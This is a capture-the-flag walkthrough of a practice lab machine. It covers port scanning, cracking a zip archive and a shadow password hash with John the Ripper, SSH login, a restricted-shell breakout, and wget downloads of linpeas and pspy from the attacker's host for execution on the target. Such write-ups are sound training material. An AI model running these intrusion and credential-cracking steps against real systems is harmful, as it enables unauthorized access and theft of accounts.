```shell
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.224.85 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.224.85:22
Open 192.168.224.85:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 04:07 EDT
Initiating Parallel DNS resolution of 1 host. at 04:07
Completed Parallel DNS resolution of 1 host. at 04:07, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:07
Scanning 192.168.224.85 [2 ports]
Discovered open port 22/tcp on 192.168.224.85
Discovered open port 80/tcp on 192.168.224.85
Completed Connect Scan at 04:07, 0.17s elapsed (2 total ports)
Nmap scan report for 192.168.224.85
Host is up, received user-set (0.17s latency).
Scanned at 2023-10-20 04:07:49 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

```shell
> rustscan -u 5000 -p 22,80 -a 192.168.224.85 -- -Pn -sCV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.224.85:80
Open 192.168.224.85:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 04:09 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:09
Scanning 192.168.224.85 [2 ports]
Discovered open port 80/tcp on 192.168.224.85
Discovered open port 22/tcp on 192.168.224.85
Completed Connect Scan at 04:09, 0.17s elapsed (2 total ports)
Initiating Service scan at 04:09
Scanning 2 services on 192.168.224.85
Completed Service scan at 04:09, 6.35s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.224.85.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 5.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Nmap scan report for 192.168.224.85
Host is up, received user-set (0.17s latency).
Scanned at 2023-10-20 04:09:20 EDT for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxxReThUimjbPP7ZO1dPbvqSobxafY5J8i9Un5zUH7z9uIZEOHNXzEsq8Vko44IBRv2a7xvuuqtk7yN3XwKdyh8mrt1bV/C7Yx6CZ1q7CiQyYd0QoUqyrp6dGdT6T4fYZ7OwUwyubgqEYdkmiS8qNvlKI2qWdj9hntzzWF9X0F+jbxhLOi6Ovo5DGaSiKxsU/ISjnDsR3geodqeVHbMR+jRq7ucIjRSIOHvp8u9LvrugorZDhdv14yJQj7zfySL1T8WcI8kKUECmZgZTk6iUKYLWZ95oo07kKIs6EeTEGNswUeTjEVebhUFHMep6W1ehU7cE6OREkeZ0Rvuh4EpUTx
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKuMuZL3YT/QadMNsFaoWvNYLjKK/DlWoz1/15wGhrauU2OMlHQWEc7ChAX+QdIWc1aEN6IAabgvzIzHPnRYV0=
|   256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNCj4KmJHpZhhE3ZdD/NkVmz1ePM2XW6l0uK3yCT0Og
80/tcp open  http    syn-ack Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

```http
http://192.168.224.85/
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/88c19013-ae23-4dc3-a70b-e07b36990ac0)
```http
http://192.168.224.85/save.zip
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/82622edc-9a9b-4ae1-adc5-e7b5a0fe05e3)

Crack Zipped File
```shell
> zip2john save.zip > save.hash
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2894c428-e5bd-4ece-9925-4ac9c70cd115)

```shell
> john --wordlist=/usr/share/wordlists/rockyou.txt save.hash
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2f656a59-911a-4b4f-a321-0a14c05dee0c)

```shell
password: manuel
```

```shell
> unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname 
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/23eb7457-c8da-451a-9669-b5ca0dc29723)

```shell
> cd etc
> ls -lah
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/99024b6e-1de5-4cfa-812c-a7f63d513f8e)

```shell
> cat shadow
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/a4f26b74-9050-4cfa-bc19-ac3d9dca3158)

```shell
echo "296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us. > user.hash
```
Crack the Hash
```shell
> john --wordlist=/usr/share/wordlists/rockyou.txt user.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt user.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)     
1g 0:00:00:06 DONE (2023-10-20 04:32) 0.1560g/s 2675p/s 2675c/s 2675C/s felton..Hunter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/099ec0d4-40dc-45cf-bb0f-aed100f6a671)
```shell
password: server
```

SSH
```shell
> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85
> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85
The authenticity of host '192.168.224.85 (192.168.224.85)' can't be established.
ED25519 key fingerprint is SHA256:qzYkm7MeglkL3QtA6bU4nv7yc8jlb1x7fZ7ALPBohNQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.224.85' (ED25519) to the list of known hosts.
296640a3b825115a47b68fc44501c828@192.168.224.85's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
```

Restricted RBash
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/77049140-1311-4a84-a636-c28eb2b5140d)

Tip:
Use `compgen` to list all the commands available in the system's PATH..
```shell
compgen -c
```

Restricted RBash Breakout - SSH
```shell
> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85 -t "bash --noprofile"
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7c673bf5-9a5a-4d3c-aa9e-4d5340558003)

Linpeas
```shell
> python -m http.server 80
```
```shell
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/wget http://192.168.45.198/linpeas.sh
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4849942c-9d08-4f49-99f1-d19fa2cc3a40)
Did not find anything interesting.

PSPY
```shell
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/wget http://192.168.45.198/pspy32
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/b2d3d796-98c4-42c5-9276-ad9de43202e5)
```shell
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/chmod +x pspy32
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy32
```

![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4e78c408-f6ad-461e-ad01-e0f79f735a84)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/dd799e2f-6015-49ef-a313-e802b25acd35)

![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/af6f3248-5550-4847-90d2-c4ef7159b6d4)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/15487712-725b-4abe-bc6c-ec74bf9de091)

![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/5bdcbb6c-24fe-4fd7-832a-beaef284fb6c)
